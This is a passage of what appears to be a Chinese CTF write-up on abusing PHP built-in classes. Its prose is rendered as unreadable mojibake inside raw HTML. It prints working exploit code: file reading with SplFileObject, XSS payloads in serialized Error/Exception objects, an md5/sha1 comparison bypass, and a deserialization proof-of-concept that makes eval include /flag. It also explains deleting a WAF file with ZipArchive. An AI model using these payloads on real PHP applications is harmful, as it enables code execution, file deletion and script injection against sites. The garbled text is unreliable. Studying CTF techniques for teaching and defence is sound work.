class="built_in">SplFileObject</span>(<span class="string">&#x27;/1.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$context</span>;</span><br></pre></td></tr></table></figure><p>ä½†æ¯æ¬¡åªèƒ½è¯»å–æ–‡ä»¶ä¸­çš„ä¸€è¡Œå†…å®¹</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041103402.png" alt="image-20221004110313338"></p><p>åŒæ ·é€šè¿‡éå†å¯ä»¥è¯»å–æ‰€æœ‰å†…å®¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$context</span> = <span class="keyword">new</span> <span class="built_in">SplFileObject</span>(<span class="string">&#x27;/1.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$context</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041104505.png" alt="image-20221004110427423"></p><p>ä¸€ä¸ªæœ‰è¶£çš„ä¸œè¥¿</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="string">&#x27;system&#x27;</span>)(<span class="string">&#x27;whoami&#x27;</span>);</span><br></pre></td></tr></table></figure><p>ç›¸å½“äºæ‰§è¡Œäº†<code>system(&#39;whoami&#39;)</code></p><h2 id="Error-x2F-Exceptionå†…ç½®ç±»è¿›è¡Œ-XSS"><a href="#Error-x2F-Exceptionå†…ç½®ç±»è¿›è¡Œ-XSS" class="headerlink" title="Error&#x2F;Exceptionå†…ç½®ç±»è¿›è¡Œ XSS"></a>Error&#x2F;Exceptionå†…ç½®ç±»è¿›è¡Œ XSS</h2><p><strong>Errorç±»</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.php7</span><br><span class="line">2.å¼€å¯æŠ¥é”™</span><br></pre></td></tr></table></figure><p>Errorç±»ç”±äºå…¶å†…éƒ¨çš„<code>__toString</code>æ–¹æ³•ï¼Œåœ¨php7ç¯å¢ƒä¸‹å¯èƒ½ä¼šå­˜åœ¨XSSæ¼æ´ï¼Œåœ¨æ„é€ phpååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œå¦‚æœæœ‰ä¸ªPOPé“¾éš¾ä»¥æ„é€ æˆ–è€…èµ°ä¸é€šï¼Œå¯ä»¥å°è¯•XSS</p><p>æµ‹è¯•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xss</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xss&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xss</span>;</span><br></pre></td></tr></table></figure><p><strong>poc</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xss</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;This is a Error xss test!&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$test</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$xss</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$test</span>);  </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041049324.png" alt="image-20221004104902256"></p><p><strong>Exception</strong>ç±»</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.php5ã€7</span><br><span class="line">2.å¼€å¯æŠ¥é”™</span><br></pre></td></tr></table></figure><p>åŸç†ä¸€æ ·</p><p>æµ‹è¯•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xss</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xss&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xss</span>;</span><br></pre></td></tr></table></figure><p><strong>poc</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xss</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;This is a Exception xss test!&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$test</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$xss</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$test</span>);  </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041050313.png" alt="image-20221004105002244"></p><h2 id="Error-x2F-Exceptionå†…ç½®ç±»ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ"><a href="#Error-x2F-Exceptionå†…ç½®ç±»ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ" class="headerlink" title="Error&#x2F;Exceptionå†…ç½®ç±»ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ"></a>Error&#x2F;Exceptionå†…ç½®ç±»ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ</h2><p><strong>Error</strong> æ˜¯æ‰€æœ‰PHPå†…éƒ¨é”™è¯¯ç±»çš„åŸºç±»ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041105289.png" alt="image-20221004110557213"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">å±æ€§</span><br><span class="line"></span><br><span class="line">message é”™è¯¯æ¶ˆæ¯å†…å®¹</span><br><span class="line"></span><br><span class="line">code é”™è¯¯ä»£ç </span><br><span class="line"></span><br><span class="line">file æŠ›å‡ºé”™è¯¯çš„æ–‡ä»¶å</span><br><span class="line"></span><br><span class="line">line æŠ›å‡ºé”™è¯¯çš„è¡Œæ•°</span><br><span class="line"></span><br><span class="line">previous ä¹‹å‰æŠ›å‡ºçš„å¼‚å¸¸</span><br><span class="line"></span><br><span class="line">string å­—ç¬¦ä¸²å½¢å¼çš„å †æ ˆè·Ÿè¸ª</span><br><span class="line"></span><br><span class="line">trace æ•°ç»„å½¢å¼çš„å †æ ˆè·Ÿè¸ª</span><br></pre></td></tr></table></figure><p>**Exception **æ˜¯æ‰€æœ‰å¼‚å¸¸çš„åŸºç±»</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041106331.png" alt="image-20221004110645251"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">å±æ€§</span><br><span class="line"></span><br><span class="line">message å¼‚å¸¸æ¶ˆæ¯å†…å®¹</span><br><span class="line"></span><br><span class="line">code å¼‚å¸¸ä»£ç </span><br><span class="line"></span><br><span class="line">file æŠ›å‡ºå¼‚å¸¸çš„æ–‡ä»¶å</span><br><span class="line"></span><br><span class="line">line æŠ›å‡ºå¼‚å¸¸åœ¨è¯¥æ–‡ä»¶ä¸­çš„è¡Œå·</span><br><span class="line"></span><br><span class="line">previous ä¹‹å‰æŠ›å‡ºçš„å¼‚å¸¸</span><br><span class="line"></span><br><span class="line">string å­—ç¬¦ä¸²å½¢å¼çš„å †æ ˆè·Ÿè¸ª</span><br><span class="line"></span><br><span class="line">trace æ•°ç»„å½¢å¼çš„å †æ ˆè·Ÿè¸ª</span><br></pre></td></tr></table></figure><p>åŒæ ·çš„ï¼Œåœ¨è¿™ä¸¤ä¸ªç±»é‡Œä¹Ÿæœ‰__toString æ–¹æ³•</p><p>çœ‹çœ‹ä¼šè¿”å›ä»€ä¹ˆ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;test&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Error: test in D:\phpstudy_pro\WWW\lesson\10.php:2</span></span><br><span class="line"><span class="comment">Stack trace:</span></span><br><span class="line"><span class="comment">#0 &#123;main&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°è¿”å›äº†é”™è¯¯ä¿¡æ¯â€testâ€å’Œé”™è¯¯åœ¨å“ªè¡Œâ€2â€,ä½†æ˜¯ä¼ å…¥çš„é”™è¯¯ä»£ç â€1â€å¹¶æ²¡æœ‰è¢«å›æ˜¾å‡ºæ¥</p><p>çœ‹ä¸‹é¢è¿™ä¸ªä¾‹å­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> === <span class="variable">$b</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;a=b&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;a!=b&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;md5å:a=b&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$a</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;sha1å:a=b&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041109722.png" alt="image-20221004110918646"></p><p>æ‰€ä»¥å¯ä½¿ç”¨è¿™ä¸¤ä¸ªç±»ç»•è¿‡å“ˆå¸Œçš„åˆ¤æ–­ï¼Œä½†æ˜¯è¦æ³¨æ„çš„æ˜¯<strong>Error</strong>ç±»æ˜¯ä»php7æ‰å¼€å§‹å¼•å…¥çš„ï¼Œè€Œ<strong>Exception</strong>ç±»ä»php5å°±å¼€å§‹å¼•å…¥äº†</p><h3 id="2020-æå®¢å¤§æŒ‘æˆ˜-Greatphp"><a href="#2020-æå®¢å¤§æŒ‘æˆ˜-Greatphp" class="headerlink" title="[2020 æå®¢å¤§æŒ‘æˆ˜]Greatphp"></a>[2020 æå®¢å¤§æŒ‘æˆ˜]Greatphp</h3><p>é¢˜ç›®æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">           <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">               <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;great&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªç»å…¸çš„å“ˆå¸Œå€¼åˆ¤æ–­ç»•è¿‡é¢˜ï¼Œä½¿ç”¨Error&#x2F;Exceptionç±»ç»•è¿‡</p><p>å› ä¸ºè¿‡æ»¤äº†å°æ‹¬å·ï¼Œå¯¼è‡´æ— æ³•ä½¿ç”¨å‡½æ•°ï¼Œå¯ä»¥ç”¨includeç›´æ¥åŒ…å«&#x2F;flag;è¿‡æ»¤äº†å¼•å·ï¼Œå¯ä»¥ç”¨urlå–åç»•è¿‡</p><p><strong>POC</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">   <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">   <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;?&gt;&lt;?=include~&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">1</span>);<span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SYCLOVER</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;syc = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;lover = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>)));</span><br></pre></td></tr></table></figure><p>åœ¨$strå‰é¢å†åŠ ä¸Šä¸€ä¸ª<code>?&gt;</code>æ˜¯å› ä¸ºException ç±»ä¸ Error çš„ __toString æ–¹æ³•åœ¨eval()å‡½æ•°ä¸­è¾“å‡ºçš„ç»“æœæ˜¯ä¸å¯èƒ½æ§çš„ï¼Œå³è¾“å‡ºçš„æŠ¥é”™ä¿¡æ¯ä¸­ï¼Œpayloadå‰é¢è¿˜æœ‰ä¸€æ®µæ— ç”¨çš„ä¿¡æ¯â€Error:â€¦â€¦â€æ‰€ä»¥è¦å…ˆç”¨?&gt;é—­åˆä¸€ä¸‹ï¼Œå˜æˆ<code>eval(&quot;...Error: ?&gt;&lt;?php shell ?&gt;&quot;)</code>ï¼Œè¿™æ ·æ‰èƒ½æˆåŠŸæ‰§è¡Œå‘½ä»¤</p><h2 id="ZipArchive-ç±»åˆ é™¤æ–‡ä»¶"><a href="#ZipArchive-ç±»åˆ é™¤æ–‡ä»¶" class="headerlink" title="ZipArchive ç±»åˆ é™¤æ–‡ä»¶"></a>ZipArchive ç±»åˆ é™¤æ–‡ä»¶</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZipArchiveç±»æ˜¯PHPçš„ä¸€ä¸ªåŸç”Ÿç±»ï¼Œå®ƒæ˜¯åœ¨PHP 5.20ä¹‹åå¼•å…¥çš„ã€‚ZipArchiveç±»å¯ä»¥å¯¹æ–‡ä»¶è¿›è¡Œå‹ç¼©ä¸è§£å‹ç¼©å¤„ç†</span><br></pre></td></tr></table></figure><p>ZipArchiveç±»ä¸­å­˜åœ¨ä¸€ä¸ª<strong>open</strong>æ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041110028.png" alt="image-20221004111056943"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œå¦‚æœè®¾ç½®flagså‚æ•°çš„å€¼ä¸º ZipArchive::OVERWRITE çš„è¯ï¼Œå¯ä»¥æŠŠæŒ‡å®šæ–‡ä»¶åˆ é™¤</p><p>æ‰€ä»¥åœ¨åšé¢˜æ—¶å¯ä»¥åˆ©ç”¨ZipArchiveç±»è°ƒç”¨openæ–¹æ³•åˆ é™¤æ‰wafæ–‡ä»¶</p><h3 id="NepCTF2021-æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­"><a href="#NepCTF2021-æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­" class="headerlink" title="NepCTF2021 æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­"></a>NepCTF2021 æ¢¦é‡ŒèŠ±å¼€ç‰¡ä¸¹äº­</h3><p>æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;shell.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$choice</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$register</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;register)===<span class="string">&quot;21232f297a57a5a743894a0e4a801fc3&quot;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice=<span class="keyword">new</span> <span class="title function_ invoke__">login</span>(<span class="variable">$this</span>-&gt;file,<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;choice = <span class="keyword">new</span> <span class="title function_ invoke__">register</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;choice-&gt;<span class="title function_ invoke__">checking</span>(<span class="variable">$this</span>-&gt;username,<span class="variable">$this</span>-&gt;password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$filename</span>,<span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file=<span class="variable">$file</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$filename</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content=<span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$username</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable">$password</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$this</span>-&gt;filename,<span class="variable">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;login success you can to open shell file!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">register</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checking</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$username</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable">$password</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;success register admin&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span 